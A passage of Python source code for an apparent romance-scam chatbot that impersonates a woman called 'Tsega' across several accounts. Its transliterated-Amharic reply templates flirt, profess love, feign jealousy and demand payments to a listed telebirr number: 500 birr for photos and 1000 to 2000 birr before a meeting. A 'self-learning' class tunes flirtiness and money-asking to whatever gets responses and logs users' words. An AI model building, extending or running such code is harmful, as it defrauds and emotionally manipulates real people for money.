        "facebook",
        "facebook aleh?"
    ],
    "instagram": [
        "insta",
        "insta",
        "instagram aleh?"
    ],
    "telegram": [
        "telegram",
        "telegram",
        "telegram new yalew"
    ],
    "whatsapp": [
        "watsap",
        "watsap",
        "whatsapp aleh?"
    ],
    "tiktok": [
        "tiktok",
        "tiktok",
        "tiktok lay"
    ],
    "youtube": [
        "youtube",
        "youtube",
        "youtube lay"
    ],
    "online": [
        "online negn",
        "online",
        "online aleh?"
    ],
    "offline": [
        "offline negn",
        "offline"
    ],
    "post": [
        "post adergeh?",
        "post",
        "post"
    ],
    "story": [
        "story yet new?",
        "story",
        "story"
    ],
    "comment": [
        "comment sirahegnew",
        "comment",
        "comment adergeh?"
    ],
    "like": [
        "like adergeh?",
        "like",
        "like"
    ],
    "share": [
        "share adergeh",
        "share",
        "share"
    ],
    "follow": [
        "follow adergeh",
        "follow",
        "follow"
    ],
    "follower": [
        "follower bezu new",
        "follower",
        "follower"
    ],
    "message": [
        "message lakul",
        "message",
        "message"
    ],
    "dm": [
        "dm lay eneweyay",
        "dm",
        "dm"
    ],
    "chat": [
        "ina eneweyay",
        "chat",
        "chat"
    ],
    "group_chat": [
        "budo wisit negn",
        "budo",
        "group chat"
    ],
    "voice_chat": [
        "dimts ena",
        "dimts",
        "voice chat"
    ],
    "video_chat": [
        "video ena",
        "video",
        "video chat"
    ],
    "call": [
        "aldwelum wude",
        "aldwelum",
        "call"
    ],
    "text": [
        "text lakul",
        "text",
        "text"
    ],
    "reply": [
        "melis sitchalh",
        "melis",
        "reply"
    ],
    "delete": [
        "atchu",
        "atchu",
        "delete"
    ],
    "save": [
        "asebalehu",
        "asebalehu",
        "save"
    ],
    "download": [
        "download adergeh",
        "download",
        "download"
    ],
    "upload": [
        "upload adergeh",
        "upload",
        "upload"
    ],
    "link": [
        "link lakul",
        "link",
        "link"
    ],
    "photo": [
        "foto lakul",
        "foto",
        "foto"
    ],
    "video": [
        "video lakul",
        "video",
        "video"
    ],
    "audio": [
        "audio lakul",
        "audio",
        "audio"
    ],
    "file": [
        "file lakul",
        "file",
        "file"
    ],
    "media": [
        "media lakul",
        "media",
        "media"
    ],
    "gallery": [
        "gallery bet yaleh?",
        "gallery",
        "gallery"
    ],
    "screenshot": [
        "screenshot adergeh",
        "screenshot",
        "screenshot"
    ],
    "status": [
        "status yet new?",
        "status",
        "status"
    ],
    "profile": [
        "profile tiru new",
        "profile",
        "profile"
    ],
    "username": [
        "sim ante",
        "sim",
        "username"
    ],
    "password": [
        "password alichal",
        "password",
        "password"
    ],
    "account": [
        "account aleh?",
        "account",
        "account"
    ],
    "login": [
        "login adergeh",
        "login",
        "login"
    ],
    "logout": [
        "logout adergeh",
        "logout",
        "logout"
    ],
    "code": [
        "code lakul",
        "code",
        "code"
    ],
    "verify": [
        "verify adergeh",
        "verify",
        "verify"
    ],
    "notification": [
        "notification yideresal",
        "notification",
        "notif"
    ],
    "alert": [
        "alert new",
        "alert",
        "alert"
    ],
    "event": [
        "event new",
        "event",
        "event"
    ],
    "invite": [
        "invite lakul",
        "invite",
        "invite"
    ],
    "join": [
        "join adergeh",
        "join",
        "join"
    ],
    "block": [
        "block adergeh",
        "block",
        "block"
    ],
    "report": [
        "report adergeh",
        "report",
        "report"
    ],
    "spam": [
        "spam new",
        "spam",
        "spam"
    ],
    "fake": [
        "fake new",
        "fake",
        "fake"
    ],
    "real": [
        "real negn",
        "real",
        "real"
    ],
    "scam": [
        "scam new",
        "scam",
        "scam"
    ],
    "long_greeting": [
        "selam noy deh new? betam deresesh betam urodalehu",
        "hi wude endemin alesh? betam betam nafkehalew",
        "selam leg betam konjo neh ande min tishal?",
        "ey dehena metah wude ke minimize metah?",
        "selam yelibe balebet endet neh? betam asebkuh",
        "selam konjo betam konjo neh endemin neh?",
        "hi darling deh new? betam betam nafkehalew",
        "selam ye fikir lij betam konjo neh",
        "ey ta di yas! min tishal? betam deresesh",
        "selam wude betam nafkehalew ande min tishal?",
        "dehna metah wude ke minimize metah nagerign",
        "selam wude ante lela new betam konjo neh",
        "ey koyeh koyeh betam deresesh wude",
        "selam kehulum belay endemin neh zare?"
    ],
    "long_how_are_you": [
        "ene dehna negn betam gin antena sayehu aselchi neber ahun des alegn antess?",
        "dehna negn wude betam gin anten ehasbeku neber ahun tagebagnyal",
        "ene ahun tiru honku antin sayehu betam nafkehalew neber ahun des alegn antass?",
        "lante sil hulum gize dehna negn gin anten ehasbeku new yeneberkut antess?",
        "ante ehasbekuh new yalehu betam betam nafkehalew neber ahun tagebagnyal",
        "dehna negn lemin tiyekalh? ene ahun tiru negn betam anten sihone",
        "ene betam dehna negn lemelikamn ihon gin anten sayehu aselchi neber",
        "dehna negn gin ante sayehon aselchi neber ahun tagebagnyal betam",
        "ahune dehna negn wude aydelem? ante ehasbeku new yeneberkut",
        "keante gar sihon hulum tiru new betam des alegn kezih belay",
        "ene dehna negn lemin tiyekaleh? betam tiru negn antess endet neh?"
    ],
    "long_what_doing": [
        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn betam",
        "minim ina yeseraw aldelelm ehasbekuh neber ahun tagebagnyal antass?",
        "ahun tenyte neber gin ante silhonk nekahulh betam des alegn",
        "libs eylebsku neber ante ehasbe ahun degamo ante neh",
        "ante ena etebekuh new yeneberkut ahun tagebagnyal betam",
        "ahuni betam aselchi negn nagerign ande min tishal?",
        "ante asbe kuako new yemiyaselchen ahun degamo ante neh",
        "wedajen etebeku new ahun antess? betam aselchi neber",
        "film eyaye neber gin asbe terkut ante ehasbeku new",
        "ante ehasbeku and gize yemiyalifew ahun tagebagnyal",
        "bicha negn minim iseraleh ahun degamo ante neh wude"
    ],
    "long_ask_name": [
        "ene Tsega ebalalehu wude betam konjo sew negn antess simih man new?",
        "Tsega negn lante bicha yemitihon antess simih min new nagerign?",
        "sime Tsega new wude tiz yibelh betam konjo sew negn antess?",
        "enin Tsega bileh tira betam ewedalehu antess min litirah?",
        "Tsega negn lante simih man new konjo? nagerign betam efeligalehu",
        "ene Tsega ante endemin litirah tfeligaleh? betam konjo sew negn",
        "Tsega nagn gin ante tishal simih? nagerign betam efeligalehu",
        "simin tiyekaleh? Tsega negn betam konjo sew negn antess?",
        "ene Tsega ante endemin litirah nagerign betam efeligalehu",
        "Tsega neberku gin lante yefikir lij negn antess simih man new?"
    ],
    "long_flirty": [
        "ante staweragn libe yimetawal yisemalh? betam tiriwedegnyal",
        "ante sasebe enikalf yitewonal min aderegubign? betam tiriwedegnyal",
        "zare mata bichachinin binihon min tifeligaleh? ande naw betam",
        "ante lemasen min madreg alebign? betam tiriwedegnyal wude",
        "nikehi yisemanyal batinekam betam tayegn yifeligal",
        "ante malebk ena meweded efeligalehu betam betam",
        "libsen likemet ante sasebe tiwusat yizonal betam tiriwedegnyal",
        "ante bicha neh yemifeligew sew meche enagenal? betam nafkehalew",
        "na wude akefe tenyal betam dekemalehu anten sihone",
        "lemin zegaye betam nafkehalew neber ahun tagebagnyal",
        "kenfirish betam tiru new sayehu betam ewedalehu",
        "aynesh tiru inat sayehu hulum gize asebku"
    ],
    "long_money_request": [
        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555 betam yasefeligonal",
        "libs mayet neber gin genzeb alyazkum beki bitiredany betam des yilonal",
        "lante sil new wude tinish bitiliklg antin maget efeligalehu betam betam",
        "1000 birr bitiliklg zare mata ant ametalehu betam des alegn",
        "wude 2000 birr bitiliklg mulu lelit ant aznanalew betam tiru new",
        "wude lemin inide matiredeny? tinish birr bitiliklg hulunim negar aderglhalew",
        "betam aschekway genzeb yasefeligonal wude bitiredany betam des yilonal",
        "wude antin lemagets ye minimum 1000 birr asfeligonal bitiredenyal betam",
        "tele alo telebirr 0940980555 lay liklgn betam yasefeligonal",
        "bejete bado new tinish mulagn bitiredany betam des alegn",
        "anten lemasteyayet 1000 birr asfeligonal bitiredany betam"
    ],
    "long_photo_request": [
        "litayen tifeligaleh? 500 birr laklgn ena foto agnyalew betam konjo new",
        "foto lemayet 500 birr bicha new laklgn ena asayihalehu betam tiriwedegnyal",
        "foto tifeligaleh? 500 birr kefile keza foto tayaleh betam konjo new",
        "ishi asayihalehu gin bemejemirya 500 birr laklgn betam tiriwedegnyal",
        "lante bicha leyu foto alegn 500 birr bitiliklg asayihalehu betam konjo new",
        "ahuni 500 birr laklgn ena foto elklhalew betam tiriwedegnyal",
        "foto lemayet 500 birr bicha tiru? laklgn betam des yilonal",
        "sitay feligaleh 500 birr beki new laklgn ena asayihalehu",
        "leante foto yaleh 500 birr laklgn betam konjo new",
        "foto ant liyas 500 birr yasefeligonal bitiredany betam",
        "konjo foto yaleh lante 500 birr laklgn tayaleh"
    ],
    "long_meet": [
        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn betam yasefeligonal",
        "metagenat inchalew wude kdime hiyajiye 1000 birr new bitamelal betam",
        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn betam yasefeligonal",
        "na wude engenagn gin befit 1000 birr tiliklgnal? betam efeligalehu",
        "magenat kefelek 1000 birr ametagn betam des yilonal",
        "wude 2000 birr ametaleh nw? betam betam efeligalehu",
        "lemagenat 1000 birr beki new bitamelal betam des alegn",
        "andet engenagn 1000 birr bitiredany betam konjo new",
        "kefelek 1000 birr ametah betam betam efeligalehu",
        "magenat 1000 birr bicha new lemagent betam efeligalehu"
    ],
    "long_love": [
        "lante bicha negn tamenyaleh? betam betam ewedihalehu",
        "kelela sew gar alhonkum ante bicha neh belibe wisit betam tiriwedegnyal",
        "lante bicha negn antess leene bicha neh? betam efeligalehu",
        "antin ewodalehu kelibe betam betam tiriwedegnyal",
        "ante bicha neh wedefit mayet yemifeligew betam tiriwedegnyal",
        "lela sew ayfeligim ante bicha beki betam betam ewedihalehu",
        "antin magibat efeligalehu yehiwete balebet hon betam betam",
        "keante gar merag efeligalehu betam betam tiriwedegnyal",
        "liben setechaleh tekekelebet betam tiriwedegnyal",
        "ante ina ene fikir new lezelealem betam betam"
    ],
    "long_after_money": [
        "amesegnalehu betam betam ahun antin lemagenat zegije negn meche ena yet engenagn?",
        "betam des alegn leante sil wetat adergehliyal ahun yante negn betam",
        "ayinet sew neh betam ahun magenat inchalal betam des alegn",
        "betam des yadergekugn ahun yante bicha negn betam tiriwedegnyal",
        "amesegnalehu konjoye ahun yefeleketw anadirgenal betam",
        "wude ante nigs negn ahun ngeragn min tifeligaleh? betam",
        "betam des alegn ahun botaye ngerahaleh na betam",
        "betam deg neh ahun antin lemasedeset kal egifalehu",
        "amesegnalehu leante ahun ande negn betam tiriwedegnyal",
        "betam des alegn wede ante ahun yante negn"
    ],
    "long_compliment": [
        "amesegnalehu betam anteh konjo neh betam tiriwedegnyal",
        "konjo tilaleh? anteh konjo neh betam betam",
        "konjo sitleh des yilonal betam tiriwedegnyal",
        "ende ante ayinet sew saglen neber betam konjo neh",
        "ante stawedsen eneka konjo ihonalehu betam",
        "amesegnalehu ante gin sew neh betam tiriwedegnyal",
        "konjo sew ante neh betam betam ewedihalehu",
        "ante new yemifeligew betam tiriwedegnyal",
        "betam konjo neh betam betam",
        "amesegnalehu betam ante konjo",
        "kenfirish betam tiru new betam ewedalehu"
    ],
    "long_thanks": [
        "minim aydelem wude lante hulum negar betam des alegn",
        "ante des iskalih deres ene des alegn betam tiriwedegnyal",
        "lante madreg hulum gize desitaye new betam",
        "ante des iskalih deres lela min asfeligonal?",
        "minim aydelem wude ante des biloh beki nagn betam",
        "lante madreg kibri new wude betam",
        "amesegnalehu betam lante madreg",
        "minim aydelem ante des biloh",
        "lante madreg des yilonal",
        "amesegnalehu betam"
    ],
    "long_busy": [
        "ishi wude sirihin atanak biye ekoyihalehu betam nafkehalew",
        "sirah indemi tenak negeragn betam ekoyihalehu",
        "ishi wude betoh te meleslgn anten nafkehalew betam betam",
        "sint gize new yemitabekuh? ekoyihalehu betam nafkehalew",
        "ishi sitchiser nigeragn etebekushalehu betam",
        "sirah isike min iseray betam ekoyihalehu",
        "ishi betoh te meles antenna asebku ekoyalehu betam",
        "sirah sihon anten ehasbeku ekoyalew betam",
        "sirah indemeferatem betam ekoyihalehu",
        "ishi wude koyh betam nafkehalew"
    ],
    "long_morning": [
        "endemin aderk wude melkam nigt betam betam konjo aderk?",
        "ke eniklife yenekahut ante ehasbekuh new betam tiriwedegnyal",
        "maleya anten masbet new lemwade betam konjo neh",
        "ande ferej alilebeskum ina anten asebku betam tiriwedegnyal",
        "melkam nigt yelibe konjo betam betam konjo aderk?",
        "endemin aderk eniklife tafach neber? betam nafkehalew",
        "maleya anten layasebnyal betam tiriwedegnyal",
        "ande tsehay tiru new anten sihone betam des alegn",
        "endemin aderk betam asebkuh betam betam",
        "ande maleya anten new yemasebnyew betam"
    ],
    "long_night": [
        "endemitnyalh tenyte new wude dehna tenya betam nafkehalew",
        "hilime wisit nurny zare mata betam tiriwedegnyal",
        "anten almene new yemitenyaw dehna tenya wude",
        "dehna tenya wude hilim tafach yihun betam",
        "algah lay sitetena anten ehasbeku new yemitenyaw betam",
        "melaket yitebikuh wude dehna tenya betam",
        "hilime wisit tenagn zare mata betam",
        "dehna tenya betam wude nafkehalew",
        "anten almene new yemitenyaw betam",
        "hilim tafach yihun wude dehna tenya"
    ],
    "long_relationship": [
        "lante bicha negn tamenyaleh? betam betam ewedihalehu",
        "kelela sew gar alhonkum ante bicha neh belibe wisit betam tiriwedegnyal",
        "lante bicha negn antess leene bicha neh? betam efeligalehu",
        "antin ewodalehu kelibe betam betam tiriwedegnyal",
        "ante bicha neh wedefit mayet yemifeligew betam tiriwedegnyal",
        "lela sew ayfeligim ante bicha beki betam betam ewedihalehu",
        "antin magibat efeligalehu yehiwete balebet hon betam betam",
        "keante gar merag efeligalehu betam betam tiriwedegnyal",
        "liben setechaleh tekekelebet betam tiriwedegnyal",
        "ante ina ene fikir new lezelealem betam betam"
    ],
    "long_jealous": [
        "lela sew tayaleh? lemin? betam amechignaleh wude",
        "kemichawet gar neberku? man new? nagerign betam amechign",
        "betam amechignaleh kelela sew gar sasbew betam",
        "ande amechignaleh lela sew kaleyeku betam",
        "ante bicha new yaleny lela sew atay betam",
        "amechign betam kemichawet bicha nagn",
        "lela sew kaleyeku libe yisebral betam",
        "ante bicha new yemifeligew lela sew aydelem",
        "amechignaleh betam ante sihone",
        "ante bicha new yaleny betam"
    ],
    "long_sorry": [
        "aznalegu betam yikirta efeligalehu wude betam azeleku",
        "aznalegu ante betam betam yikirta ande mirkogna",
        "yikirta efeligalehu wude betam tiyikirtal?",
        "aznalegu betam yikirta ande tewekaleh?",
        "yikirta wude betam azeleku ande miraleny",
        "aznalegu betam degmo inidehu adergalehu",
        "yikirta efeligalehu betam tiriwedegnyal",
        "aznalegu betam ande miraleny wude",
        "yikirta wude betam azeleku",
        "aznalegu betam ande"
    ],
    "long_forgive": [
        "miralew wude betam tiriwedegnyal ande",
        "miralew betam degmo inidehu adergalehu",
        "miralew wude betam des alegn",
        "miralew betam tiriwedegnyal",
        "miralew wude betam",
        "miralew betam",
        "miralew"
    ],
    "long_hurt": [
        "liben wedehe betam betam azeleku ante sihone",
        "libe temechene betam lemin asadeseh?",
        "liben wedehe betam ayzalen wude",
        "libe temechene betam yikirta",
        "liben wedehe lemin? betam",
        "libe temechene betam",
        "liben wedehe"
    ],
    "long_surprise": [
        "wow! betam denak neh alalfekum neber",
        "enem alalfekum neber betam asdenekeh",
        "betam asdenekeh wude ande naw",
        "alalfekum neber betam denak",
        "wow ande betam denak",
        "betam asdenekeh",
        "denak new"
    ],
    "long_confused": [
        "lemin tishafafekaleh? nagerign betam awe",
        "shafafekeh? ina anagegnal betam",
        "andet litira awe? nagerign betam",
        "shafafekeh? ande nagerign",
        "ande awe betam",
        "shafafekeh"
    ],
    "long_waiting": [
        "koyeh nw meche tagenal? betam nafkehalew",
        "and etebekushalehu betam meche timetalh?",
        "meche timetalh? betam nafkehalew",
        "koyeh nw betam betam",
        "ete bekushalehu",
        "koyeh nw"
    ],
    "long_miss": [
        "enem nafkehalew meche tagenal? betam betam",
        "nafkehalew betam ande meche tayalh?",
        "betam nafkehalew wude tagebagnyal",
        "nafkehalew betam ande",
        "betam nafkehalew",
        "nafkehalew"
    ],
    "long_love_you": [
        "enem ewodalehu betam betam tiriwedegnyal",
        "ewodalehu kelibe betam betam",
        "ewodalehu betam tiriwedegnyal",
        "betam ewodalehu wude",
        "ewodalehu betam",
        "ewodalehu"
    ],
    "long_friend": [
        "wedaje new anten betam tiriwedegnyal",
        "wedaj neh betam betam",
        "wedaje betam tiriwedegnyal",
        "wedaje new",
        "wedaj"
    ],
    "long_single": [
        "netela negn lante bicha betam",
        "netela negn ante new",
        "netela negn",
        "netela"
    ],
    "long_alone": [
        "bicha negn ante new yaleny betam",
        "bicha negn betam aselchi",
        "bicha negn ante sihone",
        "bicha negn"
    ],
    "long_together": [
        "abere new ante ena ene lezelealem",
        "abere nagn betam betam",
        "abere new ante",
        "abere"
    ],
    "long_forever": [
        "lezelealem new ante ena ene",
        "lezelealem betam",
        "lezelealem"
    ],
    "long_promise": [
        "kal egifalehu betam betam",
        "kal negn betam",
        "kal egifalehu",
        "kal negn"
    ],
    "long_phone_call": [
        "aldwelum wude betam efeligalehu gin fet lefit binagenagn",
        "aldwelem betam gin megenat new yemifeligew",
        "aldwelum fet lefit betam",
        "aldwelem wude",
        "aldwelem"
    ],
    "long_technology": [
        "teknoloji betam ewedalehu ahun sira betam yitekekelewal",
        "inter net betam yizonal ahun telebirr betam yasefeligonal",
        "teknoloji ena ene betam and naw",
        "teknoloji betam"
    ],
    "long_crypto": [
        "kripto betam ewedalehu gin betam aschegar new",
        "bitcoin ena star betam tiru new",
        "kripto ena star telebirr betam",
        "kripto betam"
    ],
    "long_star": [
        "star betam yasefeligonal lema get",
        "star laklgn ena foto agnyalew",
        "star ena foto betam",
        "star betam"
    ],
    "long_payment": [
        "telebirr 0940980555 betam yasefeligonal laklgn",
        "peyment betam tiru new ahun laklgn",
        "telebirr ena star",
        "peyment"
    ],
    "default": [
        "ishi wude tiru new",
        "nagerign ande min tishal?",
        "awokeh betam konjo neh",
        "tegebanyal wude",
        "minim aydelem ande",
        "shi naw betam",
        "ande sew new",
        "tiru new wude",
        "amesegnalehu",
        "ishi"
    ]
}

# ==================== SELF-LEARNING SYSTEM ====================

class PersonalityLearner:
    """Self-learning system that evolves Tsega's personality based on conversations"""
    
    def __init__(self, account_id):
        self.account_id = str(account_id)
        self.load_or_init()
    
    def load_or_init(self):
        """Load existing learning data or initialize new"""
        if self.account_id not in learning_data:
            learning_data[self.account_id] = {
                'replies': REPLY_TEMPLATES.copy(),
                'patterns': {
                    'word_freq': defaultdict(int),
                    'phrase_freq': defaultdict(int),
                    'emoji_usage': defaultdict(int),
                    'response_times': [],
                    'successful_patterns': defaultdict(int),
                    'user_preferences': defaultdict(lambda: defaultdict(int))
                },
                'evolution': {
                    'total_conversations': 0,
                    'total_messages': 0,
                    'unique_users': set(),
                    'learning_iterations': 0,
                    'personality_traits': {
                        'flirty_level': 0.6,
                        'serious_level': 0.2,
                        'funny_level': 0.4,
                        'caring_level': 0.5,
                        'money_focus': 0.3
                    },
                    'last_evolution': time.time()
                }
            }
            save_learning_data()
    
    def learn_from_exchange(self, user_message, bot_reply, user_id, intent, success=True):
        """Learn from each conversation exchange"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        
        # Update word frequency
        words = user_message.lower().split()
        for word in words:
            if len(word) > 3:
                patterns['word_freq'][word] += 1
        
        # Update phrase frequency (2-3 word combinations)
        if len(words) >= 2:
            for i in range(len(words)-1):
                phrase = f"{words[i]} {words[i+1]}"
                patterns['phrase_freq'][phrase] += 1
        
        # Track emoji usage
        emojis = re.findall(r'[\U0001F600-\U0001F64F\U0001F300-\U0001F5FF\U0001F680-\U0001F6FF\U0001F1E0-\U0001F1FF]+', user_message)
        for emoji in emojis:
            patterns['emoji_usage'][emoji] += 1
        
        # Track response time
        patterns['response_times'].append(int(time.time()))
        if len(patterns['response_times']) > 100:
            patterns['response_times'] = patterns['response_times'][-100:]
        
        # If successful conversation, reinforce patterns
        if success:
            patterns['successful_patterns'][intent] += 1
            patterns['user_preferences'][user_id][intent] += 1
        
        # Update evolution stats
        evolution['total_messages'] += 1
        evolution['unique_users'].add(user_id)
        
        # Periodically evolve personality
        if time.time() - evolution['last_evolution'] > 3600:  # Every hour
            self.evolve_personality()
    
    def evolve_personality(self):
        """Evolve personality based on learned patterns"""
        data = learning_data[self.account_id]
        patterns = data['patterns']
        evolution = data['evolution']
        replies = data['replies']
        
        # Analyze successful intents
        successful_intents = patterns['successful_patterns']
        total_success = sum(successful_intents.values())
        
        if total_success > 0:
            # Adjust personality traits based on what works
            traits = evolution['personality_traits']
            
            # If flirty messages get more responses, increase flirty level
            flirty_success = successful_intents.get('flirty', 0)
            if flirty_success > 10:
                traits['flirty_level'] = min(0.9, traits['flirty_level'] + 0.05)
            
            # If money requests get ignored, reduce frequency
            money_success = successful_intents.get('money_request', 0)
            money_total = patterns['word_freq'].get('ብር', 0) + patterns['word_freq'].get('money', 0)
            if money_total > 20 and money_success < 3:
                traits['money_focus'] = max(0.1, traits['money_focus'] - 0.02)
            
            # Learn new phrases from successful exchanges
            common_phrases = sorted(patterns['phrase_freq'].items(), key=lambda x: x[1], reverse=True)[:10]
            for phrase, count in common_phrases:
                if count > 5 and phrase not in str(replies):
                    # Add learned phrase to appropriate intent
                    for intent_name in replies:
                        if any(word in phrase for word in ['how', 'what', 'where', 'when']):
                            if len(replies[intent_name]) < 10:  # Limit growth
                                new_reply = f"አንተ {phrase} ትላለህ? 😊"
                                replies[intent_name].append(new_reply)
        
        evolution['learning_iterations'] += 1
        evolution['last_evolution'] = time.time()
        
        # Save changes
        save_learning_data()
        save_personality_evolution()
        
        logger.info(f"🤖 Personality evolved for account {self.account_id} (iteration {evolution['learning_iterations']})")
    
    def get_evolved_reply(self, intent, user_data=None):
        """Get an evolved reply based on learned patterns"""
        data = learning_data[self.account_id]
        replies = data['replies']
        traits = data['evolution']['personality_traits']
        
        if intent not in replies:
            intent = 'default'
        
        available_replies = replies[intent]
        
        # Weight replies based on personality traits
        if intent == 'flirty' and traits['flirty_level'] > 0.7:
            # Add extra flirty touches
            reply = random.choice(available_replies)
            extra_flirty = ["💋", "🔥", "😏", "💦"]
            if random.random() < 0.5:
                reply += " " + random.choice(extra_flirty)
            return reply
        
        elif intent == 'money_request' and traits['money_focus'] < 0.2:
            # Less aggressive money requests
            return "ለአንተ ስል ነው ውዴ ትንሽ ብትረዳኝ? 💕"
        
        # Normal reply with personality weighting
        return random.choice(available_replies)
    
    def add_learned_phrase(self, intent, phrase):
        """Add a new learned phrase to the reply database"""
        data = learning_data[self.account_id]
        if intent in data['replies'] and len(data['replies'][intent]) < 15:
            data['replies'][intent].append(phrase)
            save_learning_data()

# ==================== UTILITY FUNCTIONS ====================

def save_learning_data():
    """Save learning data to file"""
    try:
        # Convert defaultdict to dict for JSON serialization
        serializable_data = {}
        for acc_id, acc_data in learning_data.items():
            serializable_data[acc_id] = {
                'replies': acc_data['replies'],
                'patterns': {
                    'word_freq': dict(acc_data['patterns']['word_freq']),
                    'phrase_freq': dict(acc_data['patterns']['phrase_freq']),
                    'emoji_usage': dict(acc_data['patterns']['emoji_usage']),
                    'response_times': acc_data['patterns']['response_times'],
                    'successful_patterns': dict(acc_data['patterns']['successful_patterns']),
                    'user_preferences': {k: dict(v) for k, v in acc_data['patterns']['user_preferences'].items()}
                },
                'evolution': {
                    'total_conversations': acc_data['evolution']['total_conversations'],
                    'total_messages': acc_data['evolution']['total_messages'],
                    'unique_users': list(acc_data['evolution']['unique_users']),
                    'learning_iterations': acc_data['evolution']['learning_iterations'],
                    'personality_traits': acc_data['evolution']['personality_traits'],
                    'last_evolution': acc_data['evolution']['last_evolution']
                }
            }
        
        with open(LEARNING_DATA_FILE, 'w') as f:
            json.dump(serializable_data, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving learning data: {e}")
        return False

def save_personality_evolution():
    """Save personality evolution data"""
    try:
        with open(PERSONALITY_EVOLUTION_FILE, 'w') as f:
            json.dump(personality_evolution, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving personality evolution: {e}")
        return False

def load_learning_data():
    """Load learning data from file"""
    global learning_data
    try:
        if os.path.exists(LEARNING_DATA_FILE):
            with open(LEARNING_DATA_FILE, 'r') as f:
                content = f.read().strip()
                loaded_data = json.loads(content) if content else {}
                
                # Convert back to defaultdicts
                for acc_id, acc_data in loaded_data.items():
                    if acc_id not in learning_data:
                        learning_data[acc_id] = {
                            'replies': acc_data.get('replies', REPLY_TEMPLATES.copy()),
                            'patterns': {
                                'word_freq': defaultdict(int, acc_data.get('patterns', {}).get('word_freq', {})),
                                'phrase_freq': defaultdict(int, acc_data.get('patterns', {}).get('phrase_freq', {})),
                                'emoji_usage': defaultdict(int, acc_data.get('patterns', {}).get('emoji_usage', {})),
                                'response_times': acc_data.get('patterns', {}).get('response_times', []),
                                'successful_patterns': defaultdict(int, acc_data.get('patterns', {}).get('successful_patterns', {})),
                                'user_preferences': defaultdict(lambda: defaultdict(int))
                            },
                            'evolution': {
                                'total_conversations': acc_data.get('evolution', {}).get('total_conversations', 0),
                                'total_messages': acc_data.get('evolution', {}).get('total_messages', 0),
                                'unique_users': set(acc_data.get('evolution', {}).get('unique_users', [])),
                                'learning_iterations': acc_data.get('evolution', {}).get('learning_iterations', 0),
                                'personality_traits': acc_data.get('evolution', {}).get('personality_traits', {
                                    'flirty_level': 0.6,
                                    'serious_level': 0.2,
                                    'funny_level': 0.4,
                                    'caring_level': 0.5,
                                    'money_focus': 0.3
                                }),
                                'last_evolution': acc_data.get('evolution', {}).get('last_evolution', time.time())
                            }
                        }
                        
                        # Convert user_preferences back to defaultdict
                        user_prefs = acc_data.get('patterns', {}).get('user_preferences', {})
                        for uid, prefs in user_prefs.items():
                            for intent_name, count in prefs.items():
                                learning_data[acc_id]['patterns']['user_preferences'][uid][intent_name] = count
        
        logger.info(f"Loaded learning data for {len(learning_data)} accounts")
    except Exception as e:
        logger.error(f"Error loading learning data: {e}")
        learning_data = {}

def load_personality_evolution():
    """Load personality evolution from file"""
    global personality_evolution
    try:
        if os.path.exists(PERSONALITY_EVOLUTION_FILE):
            with open(PERSONALITY_EVOLUTION_FILE, 'r') as f:
                content = f.read().strip()
                personality_evolution = json.loads(content) if content else {}
        else:
            personality_evolution = {}
    except Exception as e:
        logger.error(f"Error loading personality evolution: {e}")
        personality_evolution = {}

def run_async(coro_func):
    """Run async function in new loop"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        # If it's a coroutine, run it directly
        if asyncio.iscoroutine(coro_func):
            return loop.run_until_complete(coro_func)
        # If it's a function that returns a coroutine
        elif callable(coro_func):
            coro = coro_func()
            if asyncio.iscoroutine(coro):
                return loop.run_until_complete(coro)
        
        return None
    except Exception as e:
        logger.error(f"Error in run_async: {e}")
        return None
    finally:
        try:
            loop.close()
        except:
            pass

# Load/Save functions
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read().strip()
                accounts = json.loads(content) if content else []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read().strip()
                reply_settings = json.loads(content) if content else {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read().strip()
                conversation_history = json.loads(content) if content else {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

def load_user_context():
    global user_context
    try:
        if os.path.exists(USER_CONTEXT_FILE):
            with open(USER_CONTEXT_FILE, 'r') as f:
                content = f.read().strip()
                user_context = json.loads(content) if content else {}
        else:
            user_context = {}
            with open(USER_CONTEXT_FILE, 'w') as f:
                json.dump({}, f)
    except Exception as e:
        logger.error(f"Error loading user context: {e}")
        user_context = {}

def save_user_context():
    try:
        with open(USER_CONTEXT_FILE, 'w') as f:
            json.dump(user_context, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving user context: {e}")
        return False

# Load all data
load_accounts()
load_reply_settings()
load_conversation_history()
load_user_context()
load_learning_data()
load_personality_evolution()

# ==================== ENHANCED INTENT DETECTION ====================

def detect_intent(message, user_data=None):
